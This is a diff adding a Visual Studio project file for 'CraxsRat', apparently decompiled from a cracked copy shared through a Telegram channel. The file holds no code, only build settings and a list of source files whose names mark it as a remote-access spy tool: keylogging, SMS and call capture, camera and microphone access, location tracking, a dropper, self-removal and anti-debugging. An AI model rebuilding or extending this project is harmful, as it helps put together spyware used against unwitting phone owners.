@@ -1,0 +1,328 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="12.0" DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <!--Project was exported from assembly: C:\Users\HP\Downloads\CraxsRat v6.8 by TG @Hackfilter - Copy\CraxsRat VIP\CraxsRat_protected.exe-->
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
+    <ProjectGuid>{824100F4-DADC-4C98-A06A-84FCDAC79F13}</ProjectGuid>
+    <OutputType>WinExe</OutputType>
+    <AssemblyName>CraxsRat</AssemblyName>
+    <TargetFrameworkVersion>v4.8</TargetFrameworkVersion>
+    <ApplicationVersion>6.0.0.0</ApplicationVersion>
+    <FileAlignment>512</FileAlignment>
+    <RootNamespace>Craxs_Rat</RootNamespace>
+    <TargetFrameworkProfile />
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>bin\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugType>pdbonly</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>bin\Release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="DrakeUI.Framework">
+      <HintPath>lib\DrakeUI.Framework.dll</HintPath>
+    </Reference>
+    <Reference Include="GeoIPCitys">
+      <HintPath>lib\GeoIPCitys.dll</HintPath>
+    </Reference>
+    <Reference Include="LiveCharts">
+      <HintPath>lib\LiveCharts.dll</HintPath>
+    </Reference>
+    <Reference Include="LiveCharts.WinForms">
+      <HintPath>lib\LiveCharts.WinForms.dll</HintPath>
+    </Reference>
+    <Reference Include="LiveCharts.Wpf">
+      <HintPath>lib\LiveCharts.Wpf.dll</HintPath>
+    </Reference>
+    <Reference Include="Microsoft.VisualBasic" />
+    <Reference Include="Newtonsoft.Json">
+      <HintPath>lib\Newtonsoft.Json.dll</HintPath>
+    </Reference>
+    <Reference Include="PresentationCore" />
+    <Reference Include="PresentationFramework" />
+    <Reference Include="System" />
+    <Reference Include="System.Core" />
+    <Reference Include="System.Data" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.IO.Compression.FileSystem" />
+    <Reference Include="System.Management" />
+    <Reference Include="System.Web" />
+    <Reference Include="System.Windows.Forms" />
+    <Reference Include="System.Xml" />
+    <Reference Include="WinMM.Net">
+      <HintPath>lib\WinMM.Net.dll</HintPath>
+    </Reference>
+    <Reference Include="vm">
+      <HintPath>lib\vm.dll</HintPath>
+    </Reference>
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="_003CModule_003E.cs" />
+    <Compile Include="EXGuarder.cs" />
+    <Compile Include="dummy_ptr\{1f3161f6-9f56-4783-8038-41d0bfd456a9}.cs" />
+    <Compile Include="AsyncLock.cs" />
+    <Compile Include="CraxsAlert.cs" />
+    <Compile Include="clsComputerInfo.cs" />
+    <Compile Include="Codes.cs" />
+    <Compile Include="infoServer.cs" />
+    <Compile Include="MyWebClient.cs">
+      <SubType>Component</SubType>
+    </Compile>
+    <Compile Include="DebugProtect1.cs" />
+    <Compile Include="RegistryHandler.cs" />
+    <Compile Include="ZoomPictureBox.cs">
+      <SubType>UserControl</SubType>
+    </Compile>
+    <Compile Include="alertform.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="comptableform.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="craxscallslog.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="CraxsMsgbox.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Craxspopup.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="CraxsStore.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Dialog2.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="ShowTipform.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="smsMaker.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="snapsdownloader.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="tipfirewalltracker.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="AccountManager.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="AddNumber.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Apk_studio.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Apkinstaller.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Auto_Clicker.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Calls_Records.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="CraxsAbout.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="CraxsRatMain.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Applications.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="AppsProperties.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Build.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="CallPhone.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="CallsManager.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="CameraManager.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="ClipboardManager.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Color_Box0.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="ContactsManager.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="CraxsSettings.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Dialog1.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="DialogPloice.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Download.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Drooper.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="EditConnections.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Editor.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="EditSocket.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Faker.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FileManager.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Jector.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="KeyboardManager.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="LanguageSelector.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="nonetform.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="NotificationMaker.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="PermissionsManager.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="ScreenLoger.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="ScreenReader.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="ScreenReaderV2.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="ScreenShoter.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="SelfRemove.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Updater.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="UpdatesScreen.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="WebViewMonitor.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="GeoIP.cs" />
+    <Compile Include="GetCountryName.cs" />
+    <Compile Include="GetFlagThisIp.cs" />
+    <Compile Include="Icons.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="information.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="inp.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Keylogger.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="LocationManager.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Microphone.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Ports.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Report.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="NativeMethods.cs" />
+    <Compile Include="Notifications.cs" />
+    <Compile Include="SpySettings.cs" />
+    <Compile Include="clrSAVE.cs" />
+    <Compile Include="Notif_Sound.cs" />
+    <Compile Include="MultiSounds.cs" />
+    <Compile Include="reso.cs" />
+    <Compile Include="CustomFont.cs" />
+    <Compile Include="CustomFontDrawString.cs" />
+    <Compile Include="RefreshExplorer.cs" />
+    <Compile Include="getIconFrmReg.cs" />
+    <Compile Include="Settings.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="SecurityKey.cs" />
+    <Compile Include="ShellTerminal.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="SMSManager.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="ListData.cs" />
+    <Compile Include="PBar.cs">
+      <SubType>Component</SubType>
+    </Compile>
+    <Compile Include="ResizeableControl.cs" />
+    <Compile Include="RTB.cs">
+      <SubType>Component</SubType>
+    </Compile>
+    <Compile Include="Upload.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Win_Users.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="My\MyApplication.cs" />
+    <Compile Include="My\MyComputer.cs" />
+    <Compile Include="My\MyProject.cs" />
+    <Compile Include="My\MySettings.cs" />
+    <Compile Include="My\MySettingsProperty.cs" />
+    <Compile Include="My\Resources\Resources.cs" />
+    <Compile Include="sockets\Accept.cs" />
+    <Compile Include="sockets\Client.cs" />
+    <Compile Include="sockets\Data.cs" />
+    <Compile Include="AssemblyInfo.cs" />
+  </ItemGroup>
+  <ItemGroup>
+    <EmbeddedResource Include="        " />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="app.config" />
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+</Project>
